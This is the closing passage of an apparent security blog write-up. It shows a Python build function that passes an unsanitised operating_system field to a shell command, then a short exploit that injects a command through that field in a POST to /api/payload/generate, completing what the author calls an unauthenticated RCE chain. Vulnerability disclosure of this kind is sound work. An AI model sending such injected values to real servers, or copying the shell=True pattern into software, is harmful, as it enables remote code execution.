<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">freeze</span>(filename, icon<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, hidden<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, owner<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, operating_system<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, architecture<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Compile a Python file into a standalone executable
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    binary with a built-in Python interpreter
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    `Required`
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    :param str icon:        icon image filename
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    :param str filename:    target filename
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Returns output filename as a string
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># cross-compile executable for the specified os/arch using pyinstaller docker containers</span>
</span></span><span style="display:flex;"><span>    process <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen(<span style="color:#e6db74">&#39;docker run -v &#34;$(pwd):/src/&#34; </span><span style="color:#e6db74">{docker_container}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(
</span></span><span style="display:flex;"><span>                                src_path<span style="color:#f92672">=</span>os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(path), 
</span></span><span style="display:flex;"><span>                                docker_container<span style="color:#f92672">=</span>operating_system <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;-&#39;</span> <span style="color:#f92672">+</span> architecture), 
</span></span><span style="display:flex;"><span>                                <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">None</span>, subprocess<span style="color:#f92672">.</span>PIPE, subprocess<span style="color:#f92672">.</span>PIPE, subprocess<span style="color:#f92672">.</span>PIPE, 
</span></span><span style="display:flex;"><span>                                cwd<span style="color:#f92672">=</span>path, 
</span></span><span style="display:flex;"><span>                                shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span></code></pre></div><p>Exploiting this in python code is quite trivial.  This completes our unauthenticated RCE chain!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;User-Agent&#39;</span>: user_agent,
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;format=exe&amp;operating_system=nix$(</span><span style="color:#e6db74">{</span>command<span style="color:#e6db74">}</span><span style="color:#e6db74">)&amp;architecture=amd64&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># Authenticated session</span>
</span></span><span style="display:flex;"><span>	s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/api/payload/generate&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>data, stream<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.0000000000001</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>ReadTimeout:
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">pass</span>
</span></span></code></pre></div>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
